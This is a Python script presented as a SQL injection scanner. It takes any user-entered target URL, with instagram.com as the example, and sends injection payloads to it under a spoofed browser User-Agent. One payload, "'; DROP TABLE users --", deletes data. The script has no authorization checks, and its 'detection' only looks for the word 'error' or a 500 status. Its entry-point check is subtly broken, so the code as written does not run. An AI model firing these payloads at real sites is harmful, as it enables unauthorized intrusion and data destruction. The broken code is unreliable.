import requests
import time

def check_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT null, null, null --",
        "' OR 'x'='x",
        "' AND 1=1 --",
        "'; DROP TABLE users --",
        '" OR 1=1 --'
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    for payload in payloads:
        test_url = url + payload
        try:
            print(f"Testing payload: {payload}")
            response = requests.get(test_url, headers=headers, timeout=10)
            print(f"Status Code: {response.status_code}")  # نمایش کد وضعیت
            if "error" in response.text.lower() or response.status_code == 500:
                print(f"[!] SQL Injection vulnerability detected at: {test_url}")
                return True
            else:
                print(f"[+] No SQL Injection vulnerability detected at: {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"Error connecting to the website: {e}")
        time.sleep(1)

    return False

def check_website_accessibility(url):
    try:
        response = requests.get(url, timeout=10)
        print(f"Status Code: {response.status_code}")  # نمایش کد وضعیت
        if response.status_code == 200:
            print("Website is accessible.")
            return True
        else:
            print(f"Website returned status code {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error accessing the website: {e}")
        return False

def perform_vulnerability_scan(url):
    if check_website_accessibility(url):
        print("[+] Checking for SQL Injection vulnerabilities...")
        if not check_sql_injection(url):
            print("[+] No SQL Injection vulnerability detected.")
    else:
        print("[+] Unable to access the website. Skipping vulnerability scan.")

if name == "main":
    url = input("Enter the URL of the target website (e.g., https://instagram.com): ").strip()
    
    if not url.startswith("http://") and not url.startswith("https://"):
        print("Invalid URL format. Please start with 'http://' or 'https://'.")
    else:
        print(f"URL entered: {url}")
        perform_vulnerability_scan(url)
